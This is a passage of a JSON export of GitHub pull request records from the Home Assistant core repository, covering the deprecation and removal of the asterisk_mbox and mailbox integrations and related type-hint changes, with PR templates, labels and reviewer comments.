https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/123180",
                    "merged_at": "2024-08-05T12:43:39Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/123174",
                "title": "Remove deprecated asterisk_mbox integration",
                "labels": [
                    "breaking-change",
                    "remove-platform",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr",
                    "Quality Scale: No score"
                ],
                "user": "joostlek",
                "issue_author_association": "MEMBER",
                "number": 123174,
                "id": 2448042707,
                "state": "closed",
                "project_created_at": "2024-08-05T09:17:26Z",
                "closed_at": "2024-08-05T13:28:50Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nAsterisk_mbox has been deprecated in 2024.3.0 and has been removed.\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nRemove deprecated asterisk_mbox integration\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [x] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: https://github.com/home-assistant/home-assistant.io/pull/34131\r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [x] The code change is tested and works locally.\r\n- [x] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [x] There is no commented out code in this PR.\r\n- [x] I have followed the [development checklist][dev-checklist]\r\n- [x] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [x] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [
                    {
                        "body": "<!-- ReviewDrafterComment -->\nPlease take a look at the requested changes, and use the **Ready for review** button when you are done, thanks :+1:\n\n[_Learn more about our pull request process._](https://developers.home-assistant.io/docs/review-process#prs-are-being-drafted-when-changes-are-needed)\n",
                        "user": "home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-08-05T09:57:05Z",
                        "url": "https://github.com/home-assistant/core/pull/123174#issuecomment-2268675505"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/123174",
                    "merged_at": "2024-08-05T13:28:50Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/110930",
                "title": "Deprecate mailbox platform",
                "labels": [
                    "core",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: mailbox",
                    "integration: asterisk_cdr",
                    "deprecation",
                    "Quality Scale: No score",
                    "Quality Scale: internal"
                ],
                "user": "edenhaus",
                "issue_author_association": "CONTRIBUTOR",
                "number": 110930,
                "id": 2141845395,
                "state": "closed",
                "project_created_at": "2024-02-19T08:55:08Z",
                "closed_at": "2024-02-27T12:50:02Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nDeprecate the mailbox integration platform and the asterisk integrations, as they only implement the mailbox platform.\r\n\r\nWe deprecate the mailbox integration because the mailbox platform is used only by the asterisk integrations, where asterix_cdr has 0 active installations and asterisk_mbox only 25. By removing the mailbox platform we can also remove the custom mailbox panel from the frontend.\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nWe deprecate the mailbox integration because the mailbox platform is used only by the asterisk integrations, where asterix_cdr has 0 active installations and asterisk_mbox only 25. By removing the mailbox platform we can also remove the custom mailbox panel from the frontend.\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [x] Deprecation (breaking change to happen in the future)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: https://github.com/home-assistant/home-assistant.io/pull/31632\r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [ ] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [
                    {
                        "body": "I think we should add some context in the PR description why we remove the mailbox integration.",
                        "user": "MartinHjelmare",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T13:46:44Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1952488580"
                    },
                    {
                        "body": "<!-- ReviewDrafterComment -->\nPlease take a look at the requested changes, and use the **Ready for review** button when you are done, thanks :+1:\n\n[_Learn more about our pull request process._](https://developers.home-assistant.io/docs/review-process#prs-are-being-drafted-when-changes-are-needed)\n",
                        "user": "home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-27T07:28:58Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1965940309"
                    },
                    {
                        "body": "CI / Run tests Python 3.11 (7) (pull_request) :\r\n`FAILED tests/components/switcher_kis/test_init.py::test_update_fail - AssertionError: assert 'unavailable' != 'unavailable'` is unrelated",
                        "user": "edenhaus",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-27T12:49:31Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1966474507"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/110930",
                    "merged_at": "2024-02-27T12:50:02Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/106841",
                "title": "Enable strict typing for asterisk_cdr + asterisk_mbox",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: asterisk_cdr",
                    "code-quality",
                    "Quality Scale: No score"
                ],
                "user": "cdce8p",
                "issue_author_association": "MEMBER",
                "number": 106841,
                "id": 2061723033,
                "state": "closed",
                "project_created_at": "2024-01-01T19:09:00Z",
                "closed_at": "2024-01-01T19:45:16Z",
                "body": "## Proposed change\r\nImprove annotations and enable strict typing.\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [x] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [ ] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/106841",
                    "merged_at": "2024-01-01T19:45:16Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/78353",
                "title": "Improve type hints in mailbox",
                "labels": [
                    "core",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: mailbox",
                    "code-quality",
                    "smash"
                ],
                "user": "epenet",
                "issue_author_association": "CONTRIBUTOR",
                "number": 78353,
                "id": 1371070276,
                "state": "closed",
                "project_created_at": "2022-09-13T08:34:46Z",
                "closed_at": "2022-09-13T19:55:50Z",
                "body": "## Proposed change\n<!--\n  Describe the big picture of your changes here to communicate to the\n  maintainers why we should accept this pull request. If it fixes a bug\n  or resolves a feature request, be sure to link to that issue in the\n  additional information section.\n-->\nImprove type hints in mailbox\n\n## Type of change\n<!--\n  What type of change does your PR introduce to Home Assistant?\n  NOTE: Please, check only 1! box!\n  If your PR requires multiple boxes to be checked, you'll most likely need to\n  split it into multiple PRs. This makes things easier and faster to code review.\n-->\n\n- [ ] Dependency upgrade\n- [ ] Bugfix (non-breaking change which fixes an issue)\n- [ ] New integration (thank you!)\n- [ ] New feature (which adds functionality to an existing integration)\n- [ ] Deprecation (breaking change to happen in the future)\n- [ ] Breaking change (fix/feature causing existing functionality to break)\n- [x] Code quality improvements to existing code or addition of tests\n\n## Additional information\n<!--\n  Details are important, and help maintainers processing your PR.\n  Please be sure to fill out additional details, if applicable.\n-->\n\n- This PR fixes or closes issue: fixes #\n- This PR is related to issue: \n- Link to documentation pull request: \n\n## Checklist\n<!--\n  Put an `x` in the boxes that apply. You can also fill these out after\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\n  We're here to help! This is simply a reminder of what we are going to look\n  for before merging your code.\n-->\n\n- [ ] The code change is tested and works locally.\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\n- [ ] There is no commented out code in this PR.\n- [ ] I have followed the [development checklist][dev-checklist]\n- [ ] The code has been formatted using Black (`black --fast homeassistant tests`)\n- [ ] Tests have been added to verify that the new code works.\n\nIf user exposed functionality or configuration variables are added/changed:\n\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\n\nIf the code communicates with devices, web services, or third-party tools:\n\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \n      Updated and included derived files by running: `python3 -m script.hassfest`.\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \n      Updated by running `python3 -m script.gen_requirements_all`.\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\n- [ ] Untested files have been added to `.coveragerc`.\n\nThe integration reached or maintains the following [Integration Quality Scale][quality-scale]:\n<!--\n  The Integration Quality Scale scores an integration on the code quality\n  and user experience. Each level of the quality scale consists of a list\n  of requirements. We highly recommend getting your integration scored!\n-->\n\n- [ ] No score or internal\n- [ ] 🥈 Silver\n- [ ] 🥇 Gold\n- [ ] 🏆 Platinum\n\n<!--\n  This project is very active and we have a high turnover of pull requests.\n\n  Unfortunately, the number of incoming pull requests is higher than what our\n  reviewers can review and merge so there is a long backlog of pull requests\n  waiting for review. You can help here!\n  \n  By reviewing another pull request, you will help raise the code quality of\n  that pull request and the final review will be faster. This way the general\n  pace of pull request reviews will go up and your wait time will go down.\n  \n  When picking a pull request to review, try to choose one that hasn't yet\n  been reviewed.\n\n  Thanks for helping out!\n-->\n\nTo help with the load of incoming pull requests:\n\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\n\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\n\n<!--\n  Thank you for contributing <3\n\n  Below, some useful links you could explore:\n-->\n[dev-checklist]: https://developers.home-assistant.io/docs/en/development_checklist.html\n[manifest-docs]: https://developers.home-assistant.io/docs/en/creating_integration_manifest.html\n[quality-scale]: https://developers.home-assistant.io/docs/en/next/integration_quality_scale_index.html\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/78353",
                    "merged_at": "2022-09-13T19:55:50Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/64051",
                "title": "Adjust mailbox type hints",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr",
                    "integration: asterisk_cdr",
                    "code-quality"
                ],
                "user": "epenet",
                "issue_author_association": "CONTRIBUTOR",
                "number": 64051,
                "id": 1101752085,
                "state": "closed",
                "project_created_at": "2022-01-13T13:42:33Z",
                "closed_at": "2022-01-13T13:53:39Z",
                "body": "## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nFollow-up to #64029\r\ncc @frenck \r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [x] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] The code has been formatted using Black (`black --fast homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\nThe integration reached or maintains the following [Integration Quality Scale][quality-scale]:\r\n<!--\r\n  The Integration Quality Scale scores an integration on the code quality\r\n  and user experience. Each level of the quality scale consists of a list\r\n  of requirements. We highly recommend getting your integration scored!\r\n-->\r\n\r\n- [ ] No score or internal\r\n- [ ] 🥈 Silver\r\n- [ ] 🥇 Gold\r\n- [ ] 🏆 Platinum\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/en/development_checklist.html\r\n[manifest-docs]: https://developers.home-assistant.io/docs/en/creating_integration_manifest.html\r\n[quality-scale]: https://developers.home-assistant.io/docs/en/next/integration_quality_scale_index.html\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/64051",
                    "merged_at": "2022-01-13T13:53:39Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/63975",
                "title": "Add setup type hints to mailboxes",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr",
                    "integration: asterisk_cdr",
                    "code-quality",
                    "smash"
                ],
                "user": "epenet",
                "issue_author_association": "CONTRIBUTOR",
                "number": 63975,
                "id": 1100334223,
                "state": "closed",
                "project_created_at": "2022-01-12T13:20:05Z",
                "closed_at": "2022-01-12T13:25:37Z",
                "body": "## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nI recently discoverd async_get_handler/get_handler in mailbox platform.\r\nThis PR is 100% pure type hint\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [x] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] The code has been formatted using Black (`black --fast homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\nThe integration reached or maintains the following [Integration Quality Scale][quality-scale]:\r\n<!--\r\n  The Integration Quality Scale scores an integration on the code quality\r\n  and user experience. Each level of the quality scale consists of a list\r\n  of requirements. We highly recommend getting your integration scored!\r\n-->\r\n\r\n- [ ] No score or internal\r\n- [ ] 🥈 Silver\r\n- [ ] 🥇 Gold\r\n- [ ] 🏆 Platinum\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/en/development_checklist.html\r\n[manifest-docs]: https://developers.home-assistant.io/docs/en/creating_integration_manifest.html\r\n[quality-scale]: https://developers.home-assistant.io/docs/en/next/integration_quality_scale_index.html\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/63975",
                    "merged_at": "2022-01-12T13:25:37Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/63424",
                "title": "Add setup type hints [a]",
                "labels": [
                    "core",
                    "cla-signed",
                    "integration: api",
                    "integration: asterisk_mbox",
                    "integration: anel_pwrctrl",
                    "integration: alpha_vantage",
                    "integration: arest",
                    "code-quality",
                    "integration: airtouch4",
                    "smash"
                ],
                "user": "epenet",
                "issue_author_association": "CONTRIBUTOR",
                "number": 63424,
                "id": 1094061162,
                "state": "closed",
                "project_created_at": "2022-01-05T07:30:54Z",
                "closed_at": "2022-01-05T13:15:58Z",
